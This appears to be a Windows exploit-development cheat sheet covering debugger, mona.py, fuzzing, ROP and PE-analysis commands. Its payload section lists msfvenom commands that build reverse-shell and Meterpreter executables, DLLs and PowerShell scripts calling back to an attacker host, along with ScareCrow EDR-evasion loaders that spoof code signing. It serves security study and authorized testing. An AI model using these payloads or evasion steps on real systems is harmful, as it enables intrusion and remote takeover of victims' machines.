# BREAKER Tools - Windows

> *"Windows has its own language of exploitation. Learn to speak it fluently."*

## Debuggers

### x64dbg / x32dbg
```
# Key features
- Modern debugger for Windows
- Plugin support
- Scripting capabilities
- Trace recording

# Common operations
F2              # Set breakpoint
F7              # Step into
F8              # Step over
F9              # Run
Ctrl+G          # Go to address
Ctrl+F          # Find pattern

# Command line
x64dbg.exe -p PID                  # Attach to process
x64dbg.exe program.exe             # Debug program

# Useful plugins
- ScyllaHide (anti-anti-debug)
- SwissArmyKnife (various utilities)
- x64dbg-python (Python scripting)
- ret-sync (sync with IDA)
```

### Immunity Debugger
```
# Key features
- Python scripting built-in
- Exploit development focused
- mona.py integration

# Common commands
!mona modules                       # List modules
!mona find -s "\xff\xe4" -m module  # Find JMP ESP
!mona pattern_create 500            # Create pattern
!mona pattern_offset EIP            # Find offset
!mona rop -m module                 # Find ROP gadgets
!mona jmp -r esp                    # Find JMP ESP
!mona bytearray -b "\x00"           # Generate bytearray
!mona compare -f bytearray.bin -a ESP  # Compare for bad chars
!mona seh                           # Find SEH gadgets
!mona egg -t w00t                   # Generate egghunter

# mona.py configuration
!mona config -set workingfolder c:\mona\%p

# Breakpoint commands
bp address                          # Set breakpoint
bl                                  # List breakpoints
bc *                                # Clear all breakpoints
```

### WinDbg
```
# Start debugging
windbg.exe program.exe
windbg.exe -p PID                   # Attach

# Common commands
g                                   # Go/continue
p                                   # Step over
t                                   # Step into
bp address                          # Set breakpoint
bl                                  # List breakpoints
bc *                                # Clear breakpoints
r                                   # Display registers
u address                           # Disassemble
db address                          # Display bytes
dd address                          # Display dwords
dq address                          # Display qwords
da address                          # Display ASCII
du address                          # Display Unicode
s -b 0 L?80000000 ff e4             # Search bytes
!address                            # Memory info
!heap                               # Heap information
!peb                                # Process environment block
!teb                                # Thread environment block
lm                                  # List modules
x module!*                          # List symbols

# Symbols
.symfix c:\symbols                  # Set symbol path
.reload                             # Reload symbols

# Kernel debugging
.kdfiles -m file c:\path            # Map file
!process 0 0                        # List processes
```

### WinDbg Preview (Modern)
```
# Features
- Modern UI
- Time Travel Debugging (TTD)
- Enhanced scripting
- Better visualization

# Time Travel commands
!tt 0                               # Go to start
!tt 100                             # Go to end
!positions                          # List positions
g-                                  # Reverse continue
t-                                  # Reverse step into
p-                                  # Reverse step over
```

## Exploit Development Frameworks

### mona.py (Immunity Debugger)
```
# Module information
!mona modules                       # List all modules
!mona noaslr                        # Find non-ASLR modules
!mona nosafeseh                     # Find non-SafeSEH modules

# Pattern operations
!mona pc 500                        # Create pattern
!mona po 0x41424344                 # Pattern offset
!mona pattern_offset EIP            # Offset from register

# Finding gadgets
!mona find -s "\xff\xe4" -m vulnmodule  # JMP ESP
!mona jmp -r esp                    # JMP ESP
!mona jmp -r esp -cpb "\x00\x0a"    # With bad char filter
!mona seh                           # SEH overwrite gadgets
!mona rop                           # ROP gadgets
!mona rop -m module -cpb "\x00"     # ROP with bad char filter
!mona ropfunc                       # ROP function calls

# Bad character detection
!mona bytearray                     # Generate all bytes
!mona bytearray -b "\x00\x0a\x0d"   # Exclude bad chars
!mona compare -f c:\mona\bytearray.bin -a ESP

# Egghunter
!mona egg -t w00t                   # Generate egghunter

# Skeleton generation
!mona skeleton                      # Generate exploit skeleton

# Stack pivot
!mona stackpivot                    # Find stack pivots
```

### PESecurity
```powershell
# Check PE security features
Import-Module PESecurity

Get-PESecurity -file C:\path\to\binary.exe

# Output shows:
# - ASLR
# - DEP
# - SafeSEH
# - StrongNaming
# - Authenticode
# - ControlFlowGuard
```

### Process Hacker
```
# Features
- Process inspection
- Memory editing
- Module information
- Security analysis

# Useful for
- Finding loaded modules
- Inspecting memory regions
- Viewing protection flags
- Finding base addresses
```

## Payload Generation

### msfvenom (Windows)
```powershell
# Reverse shells
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell64.exe

# Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o meterpreter.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o meterpreter64.exe

# DLL payloads
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o malicious.dll

# Raw shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shellcode.bin
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f c

# Bad character avoidance
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -b "\x00\x0a\x0d" -f c

# Encoders
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f c

# Staged (smaller, needs handler)
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=4444 -f exe -o staged.exe

# Stageless (larger, standalone)
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o stageless.exe

# Service executable
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe-service -o service.exe

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f psh-reflection -o payload.ps1
```

### Donut (Shellcode Generator)
```powershell
# Generate shellcode from .NET assembly
donut.exe -i payload.exe -o payload.bin

# With specific options
donut.exe -i payload.exe -a 2 -f 1 -o payload.bin
# -a: Architecture (1=x86, 2=x64, 3=x86+x64)
# -f: Format (1=raw, 2=base64)

# Encrypt payload
donut.exe -i payload.exe -e 3 -o payload.bin
# -e: Encryption (1=none, 2=random, 3=AES)
```

### ScareCrow
```powershell
# EDR evasion payload generation
ScareCrow -I payload.bin -Loader dll -domain microsoft.com

# Options
-I              # Input shellcode
-Loader         # Loader type (binary, dll, etc.)
-domain         # Domain for code signing
-sandbox        # Add sandbox evasion
```

## Binary Analysis

### PE-bear
```
# Features
- PE structure viewer
- Section analysis
- Import/Export tables
- Resource extraction
- Hex editor

# Useful for
- Understanding PE layout
- Finding code caves
- Analyzing imports
```

### CFF Explorer
```
# Features
- PE header editing
- Section manipulation
- Import/Export editing
- Resource editing
- Rebuilding PE

# Common uses
- Modify protections
- Add sections
- Edit headers
```

### pestudio
```
# Static analysis features
- Indicators of compromise
- Entropy analysis
- String extraction
- Signature detection
- Import analysis

# Scoring system for malware indicators
```

### dumpbin (Visual Studio)
```cmd
# Headers
dumpbin /headers binary.exe

# Imports
dumpbin /imports binary.exe

# Exports
dumpbin /exports binary.dll

# Disassembly
dumpbin /disasm binary.exe

# Sections
dumpbin /section:.text binary.exe
```

## Fuzzing

### WinAFL
```powershell
# Instrument and fuzz
afl-fuzz.exe -i in -o out -D DynamoRIO\bin64 -t 20000 -- -coverage_module target.dll -fuzz_iterations 5000 -target_module target.exe -target_method Fuzz -nargs 2 -- target.exe @@

# With Intel PT
afl-fuzz.exe -i in -o out -Y -t 20000 -- -fuzz_iterations 5000 -- target.exe @@
```

### Peach Fuzzer
```xml
<!-- Peach pit example -->
<Peach xmlns="http://peachfuzzer.com/2012/Peach">
    <DataModel name="TestData">
        <String name="value" value="test"/>
    </DataModel>
    <StateModel name="State" initialState="Initial">
        <State name="Initial">
            <Action type="output">
                <DataModel ref="TestData"/>
            </Action>
        </State>
    </StateModel>
    <Test name="Default">
        <StateModel ref="State"/>
        <Publisher class="File">
            <Param name="FileName" value="test.txt"/>
        </Publisher>
    </Test>
</Peach>
```

## ROP Tools

### rp++
```cmd
# Find ROP gadgets
rp-win-x64.exe -f binary.exe -r 5

# Filter by pattern
rp-win-x64.exe -f binary.exe --unique -r 5 | findstr "pop"

# Output to file
rp-win-x64.exe -f binary.exe -r 5 > gadgets.txt
```

### ROPgadget (Windows)
```cmd
# Basic usage
ROPgadget.exe --binary binary.exe

# Search specific
ROPgadget.exe --binary binary.exe --only "pop|ret"

# Generate chain
ROPgadget.exe --binary binary.exe --ropchain
```

## Heap Exploitation

### WinDbg Heap Commands
```
!heap -s                            # Heap summary
!heap -h                            # Heap details
!heap -a HEAPADDR                   # Analyze heap
!heap -l                            # Leak detection
!heap -flt s SIZE                   # Filter by size
!heap -p -a ADDR                    # Page heap analysis
```

### Application Verifier
```
# Enable page heap
appverif /enable Heaps /for app.exe

# Full page heap
gflags /p /enable app.exe /full

# Check settings
gflags /p

# Disable
gflags /p /disable app.exe
```

## Memory Protection Bypass

### VirtualProtect (API)
```c
// Change memory protection
BOOL VirtualProtect(
    LPVOID lpAddress,         // Address to change
    SIZE_T dwSize,            // Size of region
    DWORD flNewProtect,       // New protection (PAGE_EXECUTE_READWRITE)
    PDWORD lpflOldProtect     // Old protection
);

// ROP chain to call VirtualProtect:
// 1. Push parameters
// 2. Call VirtualProtect
// 3. Jump to shellcode
```

### ROP for DEP Bypass
```
# Common ROP targets:
# - VirtualProtect: Change memory protection
# - VirtualAlloc: Allocate executable memory
# - WriteProcessMemory: Copy shellcode to executable region
# - SetProcessDEPPolicy: Disable DEP (XP SP3)

# VirtualProtect ROP chain structure:
# ROPNOP (padding)
# VirtualProtect address
# Return address (shellcode location)
# lpAddress (shellcode location)
# dwSize (size)
# flNewProtect (0x40 = PAGE_EXECUTE_READWRITE)
# lpflOldProtect (writable address)
```

## Quick Reference

### Protection Bypass
| Protection | Bypass Method |
|------------|---------------|
| DEP/NX | ROP to VirtualProtect/VirtualAlloc |
| ASLR | Info leak, partial overwrite, brute force |
| Stack Canary | Info leak, SEH overwrite |
| SafeSEH | Non-SafeSEH module, heap spray |
| CFG | Valid call target, indirect call |

### Common Gadgets Needed
```
pop ecx; ret           # Set ECX
pop edx; ret           # Set EDX
pop eax; ret           # Set EAX
xchg eax, esp; ret     # Stack pivot
push esp; ret          # Get stack address
mov [ecx], eax; ret    # Write primitive
```

### Debugging Checklist
```
[ ] Attach debugger to process
[ ] Set breakpoints at vulnerable function
[ ] Send crash payload
[ ] Note EIP/RIP value
[ ] Calculate offset
[ ] Find usable gadgets
[ ] Check for bad characters
[ ] Build ROP chain
[ ] Generate shellcode
[ ] Test exploit
```
